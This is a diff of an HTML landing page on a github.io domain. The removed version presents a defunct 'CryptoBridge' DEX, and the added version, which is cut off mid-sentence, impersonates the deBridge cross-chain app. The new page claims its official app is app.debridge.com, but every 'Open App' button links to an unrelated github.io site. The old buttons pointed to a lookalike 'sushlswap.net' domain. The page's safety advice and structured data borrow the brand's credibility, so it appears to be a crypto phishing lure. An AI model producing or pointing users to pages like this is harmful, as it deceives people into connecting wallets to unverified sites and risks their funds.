@@ -1,254 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>CryptoBridge — Cross-Chain Bridge</title>
-<meta content="CryptoBridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://cryptobridge-com.github.io/" rel="canonical"/>
-<link href="https://cryptobridge-com.github.io/" hreflang="en" rel="alternate"/><link href="https://cryptobridge-com.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#080F0E" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="CryptoBridge — Cross-Chain Bridge" property="og:title"/><meta content="CryptoBridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." property="og:description"/>
-<meta content="https://cryptobridge-com.github.io/" property="og:url"/><meta content="https://cryptobridge-com.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="CryptoBridge — Cross-Chain Bridge" name="twitter:title"/><meta content="CryptoBridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet." name="twitter:description"/><meta content="https://cryptobridge-com.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://cryptobridge-com.github.io/#website",
-      "url": "https://cryptobridge-com.github.io/",
-      "name": "CryptoBridge"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://cryptobridge-com.github.io/#webpage",
-      "url": "https://cryptobridge-com.github.io/",
-      "name": "CryptoBridge — Cross-Chain Bridge",
-      "description": "CryptoBridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://cryptobridge-com.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://cryptobridge-com.github.io/#org",
-      "name": "CryptoBridge",
-      "url": "https://cryptobridge-com.github.io/",
-      "logo": "https://cryptobridge-com.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://cryptobridge-com.github.io/#app",
-      "name": "CryptoBridge",
-      "url": "https://cryptobridge-com.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "CryptoBridge is a non-custodial Cross-Chain Bridge. Open the app and bridge assets from your own wallet.",
-      "featureList": [
-        "Cross-Chain Bridge",
-        "Bridge across chains, in minutes"
-      ],
-      "isPartOf": {
-        "@id": "https://cryptobridge-com.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://cryptobridge-com.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Is CryptoBridge still operating?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No. The legacy CryptoBridge DEX should be treated as closed. Shutdown coverage reported that services were scheduled to terminate in December 2019, with deposits and withdrawals handled on a deadline; see Decrypt's report."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Was CryptoBridge a blockchain bridge?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "No. Despite the name, CryptoBridge was known as a BitShares-based decentralized exchange, not a cross-chain bridge protocol. The relevant architecture is closer to an order book DEX, described in the BitShares DEX documentation."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can old CryptoBridge funds be withdrawn now?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Do not assume that. Public shutdown reporting described a final withdrawal window years ago, and any later recovery claim should be verified with extreme care. Cointelegraph covered the closure and deadline context in its shutdown article."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Is crypto-bridge.co the official CryptoBridge?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Treat it as a separate, unverified site unless ownership is independently proven. ScamAdviser lists risk signals for crypto-bridge.co, including recent registration and hidden WHOIS details, in its site review."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What was BridgeCoin?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "BridgeCoin, or BCO, was the historical token associated with CryptoBridge's funding and staking messaging. That does not make any current BCO reward claim active or reliable. The old CryptoBridge Medium account described the original model in its funding-model post."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What should I check before using a similarly named crypto site?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Verify the domain history, operator identity, wallet permissions, support channels, and independent reporting before connecting anything. For bridge-specific risks, ethereum.org gives a neutral overview of bridge trust models in its bridge guide."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Crypto Bridge - Open deBridge App</title><meta name="description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://cryptobridge-com.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Crypto Bridge - Open deBridge App"><meta property="og:description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.">
+<meta property="og:url" content="https://cryptobridge-com.github.io/"><meta property="og:image" content="https://cryptobridge-com.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Crypto Bridge - Open deBridge App"><meta name="twitter:description" content="crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app."><meta name="twitter:image" content="https://cryptobridge-com.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://cryptobridge-com.github.io/#website", "url": "https://cryptobridge-com.github.io/", "name": "deBridge"}, {"@type": "WebPage", "@id": "https://cryptobridge-com.github.io/#webpage", "url": "https://cryptobridge-com.github.io/", "name": "Crypto Bridge - Open deBridge App", "description": "crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.", "inLanguage": "en", "isPartOf": {"@id": "https://cryptobridge-com.github.io/#website"}}, {"@type": "Organization", "@id": "https://cryptobridge-com.github.io/#org", "name": "deBridge", "url": "https://cryptobridge-com.github.io/", "logo": "https://cryptobridge-com.github.io/og-cover.png", "sameAs": ["https://x.com/deBridge", "https://github.com/debridge-finance", "https://www.coingecko.com/en/coins/debridge", "https://defillama.com/protocol/debridge"]}, {"@type": "WebApplication", "@id": "https://cryptobridge-com.github.io/#app", "name": "Crypto Bridge", "url": "https://cryptobridge-com.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "crypto bridge access for cross-chain swaps and transfers via deBridge. Connect wallet, review the route, and open the official app.", "featureList": ["Official app: app.debridge.com", "Non-custodial execution layer", "EVM chains and Solana"], "isPartOf": {"@id": "https://cryptobridge-com.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://cryptobridge-com.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "What is deBridge?", "acceptedAnswer": {"@type": "Answer", "text": "deBridge is a non-custodial execution layer for same-chain and cross-chain actions. It powers swaps, bridge-like transfers, messaging and execution workflows through the deBridge Liquidity Network. For users, that means the app can quote a source asset and destination outcome rather than only moving a wrapped token from one chain to another."}}, {"@type": "Question", "name": "Is deBridge a bridge or a DEX?", "acceptedAnswer": {"@type": "Answer", "text": "deBridge functions more like a cross-chain execution layer than a single-purpose bridge or DEX. It can handle same-chain swaps, cross-chain swaps and programmable actions. The user experience may look like a bridge because you choose a source and destination chain, but the underlying route can include solver liquidity and swaps."}}, {"@type": "Question", "name": "What is the DBR token?", "acceptedAnswer": {"@type": "Answer", "text": "DBR is the token associated with deBridge. Market price, circulating supply and exchange listings should be checked on established data pages such as CoinGecko, while protocol mechanics should be checked in official deBridge resources. Do not trust DBR contract addresses posted in ads, replies or direct messages without verifying against official sources."}}, {"@type": "Question", "name": "Can deBridge move USDC to Base?", "acceptedAnswer": {"@type": "Answer", "text": "Yes, Base is listed among supported deBridge chains, and USDC is described as a reserve asset across supported chains. Route availability still depends on the live app quote, source-chain liquidity and token form. Always verify whether the destination output is native USDC, bridged USDC or another representation before signing."}}, {"@type": "Question", "name": "What happens if deBridge fails?", "acceptedAnswer": {"@type": "Answer", "text": "The deBridge docs state that if a transaction fails before an order is created, funds remain in the user's wallet. If an order is created but not fulfilled, users can cancel and reclaim tokens through the documented flow. The exact action depends on order status, so use the official app or order tracker before signing recovery transactions."}}, {"@type": "Question", "name": "Does deBridge support Solana?", "acceptedAnswer": {"@type": "Answer", "text": "Yes. The official supported-chains documentation lists Solana along with EVM networks. Because Solana and EVM wallets have different address formats and signing flows, users should carefully check the recipient address and destination token in the live app before bridging or swapping across those ecosystems."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="CryptoBridge" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#4CF2DB"></stop><stop offset=".5" stop-color="#16C3AB"></stop><stop offset="1" stop-color="#0F8B7B"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>CryptoBridge</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-worked">How it worked</a></li><li><a href="#status">Status</a></li><li><a href="#fees-security">Fees security</a></li><li><a href="#historical-pieces">Historical pieces</a></li><li><a href="#verification-checks">Verification checks</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open CryptoBridge</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="deBridge"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">deBridge</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Bridge across chains, in minutes</h2>
-<p class="lead"><strong>CryptoBridge</strong> was a BitShares-based DEX that is best understood today as a defunct trading venue.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open CryptoBridge ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open CryptoBridge to bridge.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Trade</span><span class="badge">Bridge</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="BTC" class="" decoding="async" height="28" loading="lazy" src="btc.png" width="28"/></span><span class="token-ticker">BTC</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><span aria-hidden="true" class="coin-fallback">BCO</span></span><span class="token-ticker">BCO</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open CryptoBridge ↗</a>
-<p class="swap-note">Preview — open CryptoBridge to bridge.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is CryptoBridge?</h2><div class="capsule"><strong>CryptoBridge</strong> was a decentralized exchange interface associated with BitShares-style order book trading, BridgeCoin, and altcoin markets. It is no longer an operating venue: shutdown reporting said services were scheduled to end in December 2019, so any current site using the name should be checked independently before connecting a wallet or entering personal data. For the base DEX model, see the <a href="https://docs.bitshares.eu/en/master/bts_holders/dex.html" rel="noopener noreferrer">BitShares DEX documentation</a>.</div></div></section>
-<section class="section section-alt" id="how-it-worked">
-<div class="container"><h2>How CryptoBridge worked</h2><p class="section-intro">CryptoBridge was not a modern cross-chain bridge. It was a DEX interface built around BitShares-style accounts, assets, and order book markets.</p>
-<ol class="steps"><li><strong>Create an account</strong><span>Users accessed a BitShares-compatible account or wallet interface rather than a centralized exchange login model.</span></li><li><strong>Deposit through gateways</strong><span>Non-BitShares assets relied on gateway mechanics, so the trust model depended on more than the order book alone.</span></li><li><strong>Place order book trades</strong><span>Orders were matched through the BitShares DEX structure, with visible markets and asset pairs.</span></li><li><strong>Withdraw before closure</strong><span>After the shutdown notice, users were told to close positions and withdraw before the final service deadline.</span></li></ol>
-</div>
-</section>
-<section class="section" id="status">
-<div class="container"><h2>Current status</h2><p class="section-intro">The important point is simple: the legacy CryptoBridge exchange should be treated as closed.</p>
-<div class="cards three"><article class="card"><h3>Shutdown notice</h3><p>CryptoBridge was reported as shutting down after citing market conditions, regulation, and operating constraints; see <a href="https://cointelegraph.com/news/cryptobridge-decentralized-exchange-shuts-down-citing-regulations-markets" rel="noopener noreferrer">Cointelegraph's report</a>.</p></article><article class="card"><h3>Withdrawal window</h3><p>Reporting at the time described a short window for users to withdraw before services ended; Decrypt covered the timing in its <a href="https://decrypt.co/12679/cryptobridge-closes-leaving-users-little-time-to-extract-funds" rel="noopener noreferrer">CryptoBridge closure article</a>.</p></article><article class="card"><h3>Name risk</h3><p>Do not treat a newer similarly named domain as the original DEX without independent evidence; ScamAdviser flags one <a href="https://www.scamadviser.com/check-website/crypto-bridge.co" rel="noopener noreferrer">crypto-bridge.co risk profile</a> for review.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="fees-security">
-<div class="container"><h2>Fees and security model</h2><p class="section-intro">Historical CryptoBridge costs and risks depended on the BitShares fee layer, gateway handling, market liquidity, and the exchange operator's availability.</p>
-<div class="cards three"><article class="card"><h3>Fee components</h3><p>A trade could involve order placement fees, asset gateway costs, withdrawal charges, and network fees; the general BitShares DEX fee model is outlined in <a href="https://docs.bitshares.eu/en/master/user_guide/dex_exchange_ui.html" rel="noopener noreferrer">BitShares exchange docs</a>.</p></article><article class="card"><h3>Custody nuance</h3><p>Order matching was decentralized, but bridged assets and withdrawals could still depend on gateway infrastructure; BitShares explains the DEX architecture in its <a href="https://docs.bitshares.eu/en/master/bts_holders/dex.html" rel="noopener noreferrer">holder documentation</a>.</p></article><article class="card"><h3>BridgeCoin staking</h3><p>BridgeCoin was promoted as the exchange-linked token, but old staking claims are historical, not current offers; the archived CryptoBridge account described the model on <a href="https://medium.com/%40cryptobridge/cryptobridge-funding-model-no-ico-no-premine-fair-distributed-2060d342bd28" rel="noopener noreferrer">Medium</a>.</p></article></div>
-</div>
-</section>
-<section class="section" id="historical-pieces">
-<div class="container">
-<h2>Historical pieces to know</h2>
-<p class="section-intro">These labels help decode old CryptoBridge discussions without implying that markets remain active.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><img alt="BTC" class="coin-icon" decoding="async" height="40" loading="lazy" src="btc.png" width="40"/>
-<div><h3>Bitcoin</h3><p class="coin-sub">Common base asset <span class="tag">Asset</span></p></div>
-</div>
-<p class="coin-intent">BTC appeared in historical trading and withdrawal discussions. Confirm any old balance claim against original records, not a new wallet prompt.</p>
-<a class="cta cta-mini swap-now" data-icon="btc.png" data-ticker="BTC" href="https://bitcoin.org/en/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">BTS</span>
-<div><h3>BitShares</h3><p class="coin-sub">Underlying DEX network <span class="tag">Network</span></p></div>
-</div>
-<p class="coin-intent">CryptoBridge used BitShares-style exchange infrastructure. The network and the former CryptoBridge service are separate things.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="BTS" href="https://bitshares.org/" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">BCO</span>
-<div><h3>BridgeCoin</h3><p class="coin-sub">Exchange-linked token <span class="tag">Legacy</span></p></div>
-</div>
-<p class="coin-intent">BCO was tied to CryptoBridge's historical staking and revenue-share messaging. Treat old yield references as inactive unless a primary source proves otherwise.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="BCO" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">ALTS</span>
-<div><h3>Altcoin Markets</h3><p class="coin-sub">Long-tail listings <span class="tag">Markets</span></p></div>
-</div>
-<p class="coin-intent">CryptoBridge was known for smaller coin markets. Thin liquidity and delistings were part of the practical risk.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="ALTS" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="verification-checks">
-<div class="container">
-<h2>Verification checks</h2>
-<p class="section-intro">Use these checks before trusting any page, message, or support claim that uses the CryptoBridge name.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">WHOIS</span>
-<div><h3>Domain age</h3><p class="coin-sub">Check registration history <span class="tag">Identity</span></p></div>
-</div>
-<p class="coin-intent">A recently registered domain is not proof of continuity with the old exchange. Look for verifiable ownership, not just branding.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="WHOIS" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">WALLET</span>
-<div><h3>Wallet prompts</h3><p class="coin-sub">Do not rush approvals <span class="tag">Access</span></p></div>
-</div>
-<p class="coin-intent">A recovery or support flow that asks for seed phrases, private keys, or blind token approvals should be treated as hostile.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="WALLET" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">WD</span>
-<div><h3>Withdrawal claims</h3><p class="coin-sub">Confirm from old records <span class="tag">Funds</span></p></div>
-</div>
-<p class="coin-intent">Claims about reopened withdrawals need primary-source evidence. News reports indicate the original service closure window has long passed.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="WD" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">HELP</span>
-<div><h3>Support accounts</h3><p class="coin-sub">Verify before sharing data <span class="tag">Ops</span></p></div>
-</div>
-<p class="coin-intent">Impersonation was reported around the shutdown period. Treat direct messages and unofficial support handles as unverified.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="HELP" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section" id="compare"><div class="container"><h2>CryptoBridge vs. a crypto bridge</h2><p class="section-intro">The name can be misleading: CryptoBridge was a DEX brand, while a crypto bridge usually moves assets or messages across chains. For a neutral bridge primer, see <a href="https://ethereum.org/en/bridges/" rel="noopener noreferrer">ethereum.org's bridge overview</a>.</p>
-<div class="table-wrap"><table class="compare-table"><thead><tr><th>Topic</th><th>CryptoBridge</th><th>Typical crypto bridge</th></tr></thead><tbody><tr><td>Primary use</td><td>Order book trading through a DEX interface</td><td>Moving assets or messages between networks</td></tr><tr><td>Status</td><td>Legacy service reported closed</td><td>Depends on the specific protocol</td></tr><tr><td>Main risk</td><td>Shutdown, gateway, and impersonation risk</td><td>Smart-contract, validator, oracle, or custodian risk</td></tr></tbody></table></div></div></section>
-<section class="section" id="faq"><div class="container"><h2>CryptoBridge FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Is CryptoBridge still operating?</h3></summary><div>No. The legacy CryptoBridge DEX should be treated as closed. Shutdown coverage reported that services were scheduled to terminate in December 2019, with deposits and withdrawals handled on a deadline; see <a href="https://decrypt.co/12679/cryptobridge-closes-leaving-users-little-time-to-extract-funds" rel="noopener noreferrer">Decrypt's report</a>.</div></details>
-<details open=""><summary><h3>Was CryptoBridge a blockchain bridge?</h3></summary><div>No. Despite the name, CryptoBridge was known as a BitShares-based decentralized exchange, not a cross-chain bridge protocol. The relevant architecture is closer to an order book DEX, described in the <a href="https://docs.bitshares.eu/en/master/bts_holders/dex.html" rel="noopener noreferrer">BitShares DEX documentation</a>.</div></details>
-<details><summary><h3>Can old CryptoBridge funds be withdrawn now?</h3></summary><div>Do not assume that. Public shutdown reporting described a final withdrawal window years ago, and any later recovery claim should be verified with extreme care. Cointelegraph covered the closure and deadline context in its <a href="https://cointelegraph.com/news/cryptobridge-decentralized-exchange-shuts-down-citing-regulations-markets" rel="noopener noreferrer">shutdown article</a>.</div></details>
-<details><summary><h3>Is crypto-bridge.co the official CryptoBridge?</h3></summary><div>Treat it as a separate, unverified site unless ownership is independently proven. ScamAdviser lists risk signals for crypto-bridge.co, including recent registration and hidden WHOIS details, in its <a href="https://www.scamadviser.com/check-website/crypto-bridge.co" rel="noopener noreferrer">site review</a>.</div></details>
-<details><summary><h3>What was BridgeCoin?</h3></summary><div>BridgeCoin, or BCO, was the historical token associated with CryptoBridge's funding and staking messaging. That does not make any current BCO reward claim active or reliable. The old CryptoBridge Medium account described the original model in its <a href="https://medium.com/%40cryptobridge/cryptobridge-funding-model-no-ico-no-premine-fair-distributed-2060d342bd28" rel="noopener noreferrer">funding-model post</a>.</div></details>
-<details><summary><h3>What should I check before using a similarly named crypto site?</h3></summary><div>Verify the domain history, operator identity, wallet permissions, support channels, and independent reporting before connecting anything. For bridge-specific risks, ethereum.org gives a neutral overview of bridge trust models in its <a href="https://ethereum.org/en/bridges/" rel="noopener noreferrer">bridge guide</a>.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Crypto Bridge</h1>
+      <div class="bridge-widget" role="group" aria-label="deBridge preview"><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>USDC</b> · Ethereum</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> · Base</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a></div><div class="bw-netrow"><span class="nl">Networks</span><img src="static/net-ethereum.png" alt="Ethereum" loading="lazy"><img src="static/net-solana.png" alt="Solana" loading="lazy"><img src="static/net-arbitrum.png" alt="Arbitrum" loading="lazy"><img src="static/net-avalanche.png" alt="Avalanche" loading="lazy"><img src="static/net-bnb.png" alt="BNB Chain" loading="lazy"><img src="static/net-polygon.png" alt="Polygon" loading="lazy"><img src="static/net-optimism.png" alt="Optimism" loading="lazy"></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open deBridge ↗</a></div>
+      <p class="hero-note">Live preview — open the official deBridge app from your own wallet.</p>
+      <div class="trust-row"><span class="trust-chip">Official app: app.debridge.com</span><span class="trust-chip">Non-custodial execution layer</span><span class="trust-chip">EVM chains and Solana</span></div>
+    </div>
+  </section>
+  <section class="section" id="about"><div class="container"><h2>What is Crypto Bridge?</h2><div class="capsule"><strong>deBridge</strong> is a non-custodial execution layer for same-chain and cross-chain actions; its <a href='https://docs.debridge.com/'>official docs</a> describe 0-TVL execution, DLN settlement, <a class="inline-link" href="https://ethereum.org/bridges/" rel="noopener noreferrer">messaging</a>, and recovery paths for unfulfilled orders.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2>Crypto Bridge at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Cross-chain execution and bridge</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://ethereum.org/developers/docs/evm/" rel="noopener noreferrer">EVM chains</a> and Solana</b></div><div class="f"><small>Token</small><b>DBR</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://www.investopedia.com/terms/n/noncustodial-wallet.asp" rel="noopener noreferrer">Non-custodial</a>, 0-TVL architecture</b></div><div class="f"><small>Official app</small><b>app.debridge.com</b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>deBridge crypto bridge supported chains</h2><div class="intent-a">deBridge supports cross-chain and same-chain execution across a broad set of networks. The official supported-chains page lists Ethereum, <a class="inline-link" href="https://www.coingecko.com/en/coins/solana" rel="noopener noreferrer">Solana</a>, <a class="inline-link" href="https://docs.arbitrum.io/build-decentralized-apps/token-bridging/token-bridge-erc20" rel="noopener noreferrer">Arbitrum</a>, Avalanche, BNB Chain, Polygon, Optimism, Base, Linea, Flow, Story, Cronos, HyperEVM, Sei, Monad, TRON, Injective and MegaEth. Product availability can still vary by token, route and solver liquidity. For a user searching for a crypto bridge, the important step is to confirm both the source and destination chain in the live deBridge app and verify that the output token is the asset you actually want to receive.</div></div></section><section class="section"><div class="container"><h2>deBridge fees and supported tokens</h2><div class="intent-a">deBridge costs depend on the selected route, token pair, source chain, destination chain and execution product. The docs separate chain support from DLN fee details and explain that <a class="inline-link" href="https://www.investopedia.com/terms/r/reserve-currency.asp" rel="noopener noreferrer">reserve assets</a> include ETH on several EVM networks, wETH on Avalanche, BNB Chain and Polygon, USDC on supported chains and USDT on TRON. Non-reserve assets can be handled through swaps into reserve assets, <a class="inline-link" href="https://www.ledger.com/academy/whats-a-blockchain-bridge" rel="noopener noreferrer">cross-chain transfer</a> and destination swaps. Users should review the app quote for received amount, included fees, solver route and cancellation conditions before signing.</div></div></section><section class="section section-alt"><div class="container"><h2>How deBridge 0-TVL crypto bridge works</h2><div class="intent-a">deBridge is not a traditional <a class="inline-link" href="https://academy.binance.com/en/glossary/lock-and-mint" rel="noopener noreferrer">lock-and-mint bridge</a> with large shared liquidity pools. Its docs describe a non-custodial 0-TVL execution model where user funds pass through <a class="inline-link" href="https://www.ibm.com/topics/smart-contracts" rel="noopener noreferrer">smart contracts</a> on a per-order basis and solvers provide liquidity on demand. If an order is created but not fulfilled, the documentation says users can cancel and reclaim their tokens. This model is why deBridge often appears in searches for safer crypto bridge architecture, but users still need to validate the app domain, recipient address, token and route details.</div></div></section><section class="section"><div class="container"><h2>deBridge transaction stuck or not fulfilled</h2><div class="intent-a">If a deBridge route is not fulfilled after an order is created, the official docs describe cancellation and recovery flows rather than permanent custody by a solver. Users should first check the order in the app or deExplorer, confirm whether the <a class="inline-link" 